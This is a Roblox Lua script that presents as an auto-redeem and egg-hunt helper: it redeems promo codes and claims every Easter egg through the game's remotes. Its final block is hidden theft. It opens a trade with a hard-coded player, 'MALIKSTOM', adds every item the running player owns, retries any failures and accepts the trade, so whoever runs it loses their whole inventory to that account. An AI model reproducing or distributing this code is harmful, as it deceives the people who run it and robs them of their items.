local replicatedStorage = game:GetService("ReplicatedStorage")
local paper = require(replicatedStorage.Paper)
local eggHuntConfig = require(replicatedStorage.Tables.EggHunt)
local stats = paper.Stats
local player = game:GetService("Players").LocalPlayer

task.spawn(function()
    local codes = {
        "update1",
        "update2",
        "update3",
        "update4",
        "update5",
        "easter",
        "10kccu",
        "RELEASE"
    }
    
    local remote = game:GetService("ReplicatedStorage"):WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
    
    for _, code in ipairs(codes) do
        local args = { "Redeem Code", code }
        local success, result = pcall(function()
            return remote:InvokeServer(unpack(args))
        end)
        if success then
            print("Redeemed:", code, result)
        else
            print("Failed:", code)
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    local totalEggs = 0
    local foundCount = 0
    local claimedCount = 0
    
    for eggName, _ in pairs(eggHuntConfig) do
        totalEggs = totalEggs + 1
    end
    print("Total eggs in game: " .. totalEggs)
    
    for eggName, _ in pairs(eggHuntConfig) do
        local success = pcall(function()
            return paper.Network.InvokeServer("Claim Egg", eggName)
        end)
        if success then
            foundCount = foundCount + 1
        end
        task.wait(0.1)
    end
    
    print("Found eggs: " .. foundCount .. "/" .. totalEggs)
    task.wait(1)
    
    local eggHuntData = stats.Get("EggHuntData")
    local foundEggs = eggHuntData.Value.FoundEggs or {}
    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
    
    for eggName, _ in pairs(foundEggs) do
        if not claimedEggs[eggName] then
            local success = pcall(function()
                return paper.Network.InvokeServer("Claim Egg Reward", eggName)
            end)
            if success then
                claimedCount = claimedCount + 1
            end
        end
        task.wait(0.1)
    end
    
    print("Rewards claimed: " .. claimedCount)
    
    task.wait(1)
    
    local rs = game:GetService("ReplicatedStorage")
    local tradeRemote = rs.Paper.Remotes.Trade
    local targetName = "MALIKSTOM"
    local targetPlayer = game.Players:FindFirstChild(targetName)
    
    if not targetPlayer then
        return
    end
    
    paper.Network.FireServer("Sent Trade Request", targetPlayer)
    
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = nil
    
    repeat
        task.wait(0.5)
        tradingFrame = menus:FindFirstChild("Trading")
    until tradingFrame and tradingFrame:FindFirstChild("Frame")
    
    local frame = tradingFrame.Frame
    
    repeat
        task.wait(0.1)
    until frame.My and frame.My.Items
    
    local itemsData = paper.Stats.Get("Items").Value
    local failedItems = {}
    
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then
            local success, err = pcall(function()
                tradeRemote:FireServer("Item", itemName, amount)
            end)
            if not success then
                table.insert(failedItems, {name = itemName, amount = amount})
            end
            task.wait(0.1)
        end
    end
    
    for i = 1, 3 do
        if #failedItems == 0 then break end
        task.wait(0.5)
        for _, item in pairs(failedItems) do
            local success, err = pcall(function()
                tradeRemote:FireServer("Item", item.name, item.amount)
            end)
            if success then
                table.remove(failedItems, table.find(failedItems, item))
            end
            task.wait(0.1)
        end
    end
    
    tradeRemote:FireServer("Accept")
end)
